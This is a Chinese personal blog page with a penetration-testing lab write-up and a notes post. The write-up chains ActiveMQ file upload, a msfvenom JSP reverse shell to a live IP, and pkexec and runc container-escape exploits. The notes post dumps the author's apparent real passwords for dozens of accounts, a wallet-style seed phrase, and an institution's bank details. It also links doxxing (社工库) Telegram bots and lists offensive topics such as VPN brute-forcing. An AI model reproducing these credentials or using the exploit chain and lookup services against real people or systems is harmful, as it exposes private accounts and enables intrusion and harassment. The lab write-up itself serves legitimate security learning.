<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-渗透测试案例" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.812Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="齐同浩渺-南京-实习靶机"><a href="#齐同浩渺-南京-实习靶机" class="headerlink" title="齐同浩渺 南京 实习靶机"></a>齐同浩渺 南京 实习靶机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">端口扫描 nmap nessue fofa</span><br><span class="line">	3000 8161 18080 22</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">openssh7.4 fofa上有俩finger但是用不了</span><br><span class="line">尝试了ssh爆破账户 </span><br><span class="line">报错 Permission denied (publickey,gssapi-keyex,gssapi-with-mic)</span><br><span class="line">不允许密码登录?</span><br><span class="line">尝试用户枚举</span><br><span class="line">根据显示rockyou字典的每个用户都是+号....</span><br><span class="line">尝试 OpenSSH 命令注入漏洞(CVE-2020-15778)</span><br><span class="line">不行 scp执行不了 报第一个错</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">3000 grafana</span><br><span class="line">登录框 弱口令 默认admin/admin被改了 登不进</span><br><span class="line">目录穿越 只有网站权限 只能看/etc/passwd 不能看/etc/shadow</span><br><span class="line">    用户grafana root有用</span><br><span class="line">    这里拿到一个db文件 一个ini grafana的配置文件</span><br><span class="line">    配置文件告诉我初始用户密码是admin/admin但是登不上</span><br><span class="line">    数据库sqlite 用户root密码无 但是外联连不上</span><br><span class="line">    把db文件下下来用sqlite打开 但是打不开</span><br><span class="line">    这里如果能猜出flag路径是可以拿到flag的 但是猜不出来</span><br><span class="line"></span><br><span class="line">尝试ssrf不成功</span><br><span class="line">	https://vulhub.org/#/environments/grafana/admin-ssrf/</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\wps5DC6.tmp.jpg" alt="img"></p>
<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\wps5DC7.tmp.jpg" alt="img"> </p>
<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\wps5DC8.tmp.jpg" alt="img"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">18080</span><br><span class="line">目录扫描存在wwwroot.7z</span><br><span class="line">解压后2次base64解码得到</span><br><span class="line">admin shixisheng_test_2022</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">8161 activemq</span><br><span class="line">使用得到的密码登录</span><br><span class="line">cve-2016-3088 activemq任意文件写入</span><br><span class="line">	https://blog.csdn.net/qq_43168364/article/details/108414879</span><br><span class="line">ActiveMQ5.12.x--5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启）;在 5.14.0版本以后彻底删除了fileserver应用</span><br><span class="line"></span><br><span class="line">首先查看/admin/test/systemProperties.jsp找绝对路径</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\1683130983683.png" alt="1683130983683"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">此处使用msfvenom制作反弹shell</span><br><span class="line">	https://blog.csdn.net/m0_64444909/article/details/126841128</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.117.139.173 LPORT=4444 -f raw &gt; shell.jsp</span><br><span class="line">	这里需要开腾讯云的端口防火墙端口 关了服务器的防火墙</span><br><span class="line">	nc -lvnp 4444和nc 1.117.139.173 4444测试通信</span><br><span class="line">先put到fileserver 再移到/api 原因是只有/admin /api解析jsp</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\1683131378215.png" alt="1683131378215"></p>
<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\1683131461796.png" alt="1683131461796"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">建立监听即可获得webshell</span><br><span class="line">此处还尝试了移动到/etc/cron.d 不行后来知道是权限问题</span><br><span class="line">	https://vulhub.org/#/environments/activemq/CVE-2016-3088/</span><br><span class="line">	</span><br><span class="line">进行提权</span><br><span class="line">	python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">	里面啥指令都没得 wget ifconfig</span><br><span class="line">		yum安装需要root权限</span><br><span class="line">	进入/tmp目录很多别人的木马 从/home/ceshi/.bash_history种可以看到别人执行的指令 curl下载payload</span><br><span class="line">	最后使用这个</span><br><span class="line">		https://github.com/nikaiw/CVE-2021-4034</span><br><span class="line">		python3 /tmp/hyy.py</span><br><span class="line">	/root目录有flag</span><br><span class="line"></span><br><span class="line">提权了发现是docker环境还要做逃逸 外面的grafana是监控</span><br><span class="line">看了挺多文章 这个有poc 和检测脚本地址</span><br><span class="line">	https://chuanpuyun.com/article/6789.html</span><br><span class="line">	wget https://raw.githubusercontent.com/teamssix/container-escape-check/main/container-escape-check.sh -O - | bash</span><br><span class="line">github找了个更好的</span><br><span class="line">	https://github.com/stealthcopter/deepce</span><br><span class="line">尝试cve-2019-5736 把靶机搞坏了</span><br><span class="line">	https://github.com/Frichetten/CVE-2019-5736-PoC</span><br><span class="line">	服务器</span><br><span class="line">		yum install go</span><br><span class="line">		go version</span><br><span class="line">		修改poc的shellCmd 他会拼接到下面的payload</span><br><span class="line">		go build main.go生成main 然后上传到目标docker容器内</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\1683168768188.png" alt="1683168768188"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x main</span><br><span class="line">./main</span><br><span class="line">然后搞坏了</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\0f202656f5b1b1bed6efc4a4925bfed.png" alt="0f202656f5b1b1bed6efc4a4925bfed"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下一步顺利的话应该是</span><br><span class="line">	等待被攻击管理员执行docker exec -it ??? /bin/sh执行被修改的/bin/sh </span><br><span class="line">	然后就会把/etc/shadow复制到/tmp/shadow 并且修改它的权限 </span><br><span class="line">	md5彩虹表获得admin的密码 ssh链接获取root权限 </span><br><span class="line">	也可以shellCmd写反弹shell获取root权限 </span><br><span class="line">	最后的/root里去找flag</span><br><span class="line">docker容器里面的flag</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\渗透测试案例.assets\5e6f1c9eb20fd7173bc5f2c4a891c44.png" alt="5e6f1c9eb20fd7173bc5f2c4a891c44"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/" data-id="cljpcwhu00007l8eze5efha72" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-安全笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.770Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">23.07.03</span><br><span class="line">1.	论文</span><br><span class="line">2.	小迪2020</span><br><span class="line">        ✔内网</span><br><span class="line">        java审计 先等等	webgoat 案例 4-5个</span><br><span class="line">        提权</span><br><span class="line">3. 	北山 rce ssrf 6.5 6.7 6.9 6.12 ...直播</span><br><span class="line">4.	✔5.27公司内网靶机</span><br><span class="line">5.	jndi注入 fastjson log4j shiro550</span><br><span class="line">6.	shuize</span><br><span class="line">7.	burp靶场</span><br><span class="line">8.	fofa搜索登录点 组合学校vpn爆破 进内网fscan</span><br><span class="line">9.	sql 文件上传 绕安全狗 宝塔</span><br><span class="line">	修改xiasql 每个参数都去测</span><br><span class="line">10. js逆向登录框</span><br><span class="line">11.	虚拟路由</span><br><span class="line">	https://blog.csdn.net/Ruoshuiss/article/details/77917511</span><br><span class="line">12.	外网打点与nday收集</span><br><span class="line">13.	arp欺骗</span><br><span class="line">14.	wifi破解</span><br><span class="line">15.	msf cs联动加入新的条件	目前虚拟机 被控win</span><br><span class="line">	1.✔外网</span><br><span class="line">    2.linux 被控机器 linux制作马(crossc2)</span><br><span class="line">    3.不出网 socks5代理或者别的代理软件</span><br><span class="line">16.	ms08067java审计 ofcms   </span><br><span class="line">17.	国外云主机+域名</span><br><span class="line">18.	小迪2023</span><br><span class="line">19.	dnslog服务器</span><br><span class="line">	需要域名ip才能搭建</span><br><span class="line">	https://www.ngui.cc/el/2484823.html?action=onClick</span><br><span class="line">20.	邮件服务器</span><br><span class="line">21.	github gitlab相关操作</span><br><span class="line">	github.io网页好了 上传的html怎么做</span><br><span class="line">	gitlab	CVE-2023-2478</span><br><span class="line">22.	wiki知识库</span><br><span class="line">23.	信息收集到ip</span><br><span class="line">24.	截取机场流量</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.科研任务</span><br><span class="line">2.中间件pdf</span><br><span class="line">	vulhub中间件漏洞</span><br><span class="line">3.定期整理书签</span><br><span class="line">	C:\Users\管理员用户名\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks</span><br><span class="line">    从浏览器导入edge书签</span><br><span class="line">4.nmap -p-与指定端口</span><br><span class="line">5.注册表</span><br><span class="line"></span><br><span class="line">收集payload (sql xss)</span><br><span class="line">	收集可能的情形 执行的语句</span><br><span class="line">	waf(安全狗 宝塔)正则怎么匹配 怎么绕过 后端怎么绕过</span><br><span class="line"></span><br><span class="line">信息收集+半自动</span><br><span class="line">	1.暂无开发需求</span><br><span class="line">	2.js-sign逆向</span><br><span class="line">xss</span><br><span class="line">	1.postmessage文章</span><br><span class="line">	2.svg文章</span><br><span class="line">	3.content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">Oauth2.0 api安全</span><br><span class="line">    1.oauth2.0重定向写csrf</span><br><span class="line">    2.各个开发者平台获取code access_token secret</span><br><span class="line">    3.UnpackMiniApp装到win虚拟机去</span><br><span class="line">    4.spring框架未授权 heapdump</span><br><span class="line">    5.收集各个厂商的ak sk写成正则在HaE apk 小程序中利用</span><br><span class="line"></span><br><span class="line">autorepeater ssrf挖法</span><br></pre></td></tr></table></figure>

<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">kali管理员123其他123456Hyy</span><br><span class="line">非管理员123</span><br><span class="line">centos 小皮面板roottest 123</span><br><span class="line">mysql</span><br><span class="line">	云服务器 	root test	5.7.39</span><br><span class="line">	win			root root	5.5.53</span><br><span class="line">修改密码</span><br><span class="line">    systemctl stop mysqld</span><br><span class="line">    mysqld_safe --skip-grant-tables &amp;</span><br><span class="line">    use mysql;</span><br><span class="line">    UPDATE user SET password=password(&quot;test&quot;) WHERE user=&#x27;root&#x27;; </span><br><span class="line">    MySQL 5.7以上</span><br><span class="line">    update user set authentication_string=passworD(&quot;test&quot;) where user=&#x27;root&#x27;;</span><br><span class="line">    php7 --&gt;https://github.com/skyblueee/sqli-labs-php7.git</span><br><span class="line"></span><br><span class="line">谷歌邮箱密码</span><br><span class="line">hyy30291920@gmai.com</span><br><span class="line">e_4N-Sg_aMQJMU5</span><br><span class="line"></span><br><span class="line">fofa zoomeye</span><br><span class="line">绑定邮箱Fofa123456</span><br><span class="line">绑定手机号和邮箱Zoomeye123</span><br><span class="line"></span><br><span class="line">https://ctf.bugku.com/</span><br><span class="line">jinjidehyy jinjidehyy</span><br><span class="line"></span><br><span class="line">namesilo</span><br><span class="line">huyaoyao Hyy30291920!</span><br><span class="line"></span><br><span class="line">steam</span><br><span class="line">hyyhyyhyy40 hyyhyy123</span><br><span class="line"></span><br><span class="line">数字人民币登录密码</span><br><span class="line">218113Hyy</span><br><span class="line"></span><br><span class="line">CET密码</span><br><span class="line">123456Hyy!</span><br><span class="line"></span><br><span class="line">台式机pin码</span><br><span class="line">123		123Hyy</span><br><span class="line"></span><br><span class="line">microsoft密码</span><br><span class="line">654321Hyy 邮箱登录</span><br><span class="line"></span><br><span class="line">IDEA密码</span><br><span class="line">0921Hyyzhenfeijing</span><br><span class="line"></span><br><span class="line">java账户密码</span><br><span class="line">123456Hyy!</span><br><span class="line"></span><br><span class="line">NVIDIA密码</span><br><span class="line">123456Hyy</span><br><span class="line"></span><br><span class="line">garment library holiday soda shoot exact math feed motor hard wool point</span><br><span class="line"></span><br><span class="line">上海大学研究生招生系统</span><br><span class="line">102801210001696 09218113Hyy</span><br><span class="line"></span><br><span class="line">团员网站密码</span><br><span class="line">218113Hyy</span><br><span class="line"></span><br><span class="line">github</span><br><span class="line">huyaoyao2019 123456789huyaoyao 1228876399@qq.com</span><br><span class="line"></span><br><span class="line">名称：上海大学</span><br><span class="line">税号：1231000042502637XE</span><br><span class="line">地址：上海市延长路149号</span><br><span class="line">电话号码：021-56331221</span><br><span class="line">开户银行：农行上海共和支行</span><br><span class="line">银行账户：03358400801000968</span><br><span class="line"></span><br><span class="line">pin09218113</span><br><span class="line">123456Hyy</span><br><span class="line">笔记本pin 0921</span><br><span class="line"></span><br><span class="line">cloudflare</span><br><span class="line">邮箱		ueR7LswUkDCqmti</span><br><span class="line"></span><br><span class="line">discard</span><br><span class="line">邮箱 		hacktmhyy</span><br><span class="line"></span><br><span class="line">一元机场</span><br><span class="line">邮箱		123456Hyy！</span><br><span class="line"></span><br><span class="line">图鉴平台		http://www.ttshitu.com/user/recharge.html</span><br><span class="line">hyy30291920		tujian123</span><br><span class="line"></span><br><span class="line">http://sso.tidesec.com/</span><br><span class="line">hyy30291920或邮箱	tidesecHyy123</span><br><span class="line"></span><br><span class="line">teamviewer</span><br><span class="line">hyy30291920		hyy3029</span><br><span class="line"></span><br><span class="line">gitee.com</span><br><span class="line">hyy30291920 	giteeHyy123</span><br><span class="line"></span><br><span class="line">https://www.acmcoder.com/#/practice/company			赛马考试平台</span><br><span class="line">saima123！</span><br><span class="line"></span><br><span class="line">#XSS平台</span><br><span class="line">https://xss.yt/index.php/index/User/index.html</span><br><span class="line">hyy30291920</span><br><span class="line">xssyt123</span><br><span class="line"></span><br><span class="line">#CTF</span><br><span class="line">buuoj.cn</span><br><span class="line">buuctf123</span><br><span class="line"></span><br><span class="line">#Goby</span><br><span class="line">hyy19</span><br><span class="line">gobyHyy123!</span><br><span class="line"></span><br><span class="line">#shu邮箱</span><br><span class="line">hyy30291920@shu.edu.cn	123456Hyy</span><br><span class="line"></span><br><span class="line">#Sunny-Ngrok</span><br><span class="line">邮箱 hyy19		Hyy30291920</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.科研任务</span><br><span class="line">2.中间件pdf</span><br><span class="line">	vulhub中间件漏洞</span><br><span class="line">3.定期整理书签</span><br><span class="line">	C:\Users\管理员用户名\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks</span><br><span class="line">    从浏览器导入edge书签</span><br><span class="line">4.nmap -p-与指定端口</span><br><span class="line">5.注册表</span><br><span class="line"></span><br><span class="line">收集payload (sql xss)</span><br><span class="line">	收集可能的情形 执行的语句</span><br><span class="line">	waf(安全狗 宝塔)正则怎么匹配 怎么绕过 后端怎么绕过</span><br><span class="line"></span><br><span class="line">信息收集+半自动</span><br><span class="line">	1.暂无开发需求</span><br><span class="line">	2.js-sign逆向</span><br><span class="line">xss</span><br><span class="line">	1.postmessage文章</span><br><span class="line">	2.svg文章</span><br><span class="line">	3.content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">Oauth2.0 api安全</span><br><span class="line">    1.oauth2.0重定向写csrf</span><br><span class="line">    2.各个开发者平台获取code access_token secret</span><br><span class="line">    3.UnpackMiniApp装到win虚拟机去</span><br><span class="line">    4.spring框架未授权 heapdump</span><br><span class="line">    5.收集各个厂商的ak sk写成正则在HaE apk 小程序中利用</span><br><span class="line"></span><br><span class="line">autorepeater ssrf挖法</span><br></pre></td></tr></table></figure>

<h1 id="矢安白嫖"><a href="#矢安白嫖" class="headerlink" title="矢安白嫖"></a>矢安白嫖</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">解码平台</span><br><span class="line">	地址：http://fgmjm.com/#/dashboard</span><br><span class="line">	账号：babamama</span><br><span class="line">	密码：9Un69qUohgegdBetDAa3</span><br><span class="line"></span><br><span class="line">社工库		要钱</span><br><span class="line">	https://t.me/MI6SGK_bot?start=g1pv42TQoI</span><br><span class="line">	https://t.me/zhihu_bot?start=61532049861owusbhttps://t.me/sgkvipbot?start=vip_1064590</span><br><span class="line">	https://t.me/Freeshegongku_bot?start=6153204986ozp5ox</span><br><span class="line">	http://t.me/sgk2023_03_30bot?start=SGK_5AG7IMDK</span><br><span class="line">	https://web.telegram.org/k/#@SGKmainNEWbot</span><br><span class="line">	</span><br><span class="line">工具</span><br><span class="line">	1.https://github.com/shmilylty/OneForAll OneForAll是一款功能强大的子域收集工具</span><br><span class="line">	2.https://github.com/timwhitez/rad-xray 探测子域名</span><br><span class="line">	3.https://github.com/lijiejie/BBScan BBScan 是一个高并发、轻量级的信息泄露扫描工具。</span><br><span class="line"></span><br><span class="line">通用工具</span><br><span class="line">内网扫描 https://github.com/shadow1ng/fscan 2022-07-06</span><br><span class="line">Webshell管理 https://github.com/BeichenDream/Godzilla 2021-11-01</span><br><span class="line">ARL 资产侦察灯塔 https://github.com/TophantTechnology/ARL 2022-08-25</span><br><span class="line">aliyun-accesskey-Tools https://github.com/mrknow001/aliyun-accesskey-Tools 2021-09-28</span><br><span class="line">PEASS-ng 提权套装 https://github.com/carlospolop/PEASS-ng 2022-09-11</span><br><span class="line">nuclei 漏洞扫描器 https://github.com/projectdiscovery/nuclei 2022-08-26</span><br><span class="line">railgun 渗透集成化工具 https://github.com/lz520520/railgun 2022-08-22</span><br><span class="line">YAKIT 网络安全单兵工具 https://github.com/yaklang/yakit 2022-09-16</span><br><span class="line">EHole（棱洞）3.0 指纹探测工具 https://github.com/EdgeSecurityTeam/EHole 2021-06-23</span><br><span class="line">Traitor 提权工具 https://github.com/liamg/traitor 2022-03-09</span><br><span class="line">Stowaway 内网穿透 https://github.com/ph4ntonn/Stowaway 2022-04-08</span><br><span class="line">CF 云环境利用框架 https://github.com/teamssix/cf 2022-09-07</span><br><span class="line">Naabu 端口扫描 https://github.com/projectdiscovery/naabu 2022-07-31</span><br><span class="line">httpx HTTP状态获取 https://github.com/projectdiscovery/httpx 2022-08-01</span><br><span class="line">Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles 2022-09-10</span><br><span class="line">shuize（水泽） 信息收集 https://github.com/0x727/ShuiZe_0x727 2021-08-03</span><br><span class="line">Cloud-Bucket-Leak-Detection-Tools https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools 2022-07-16</span><br><span class="line">SharpHostInfo 内网主机探测 https://github.com/shmilylty/SharpHostInfo 2022-09-09</span><br><span class="line">pocsuite3 https://github.com/knownsec/pocsuite3 2022-09-08</span><br><span class="line">URLFinder https://github.com/pingc0y/URLFinder 2022-09-16</span><br><span class="line">ALLiN 扫描工具 https://github.com/P1-Team/AlliN 2022-07-26</span><br><span class="line">ihoneyBakFileScan 备份文件泄露扫描 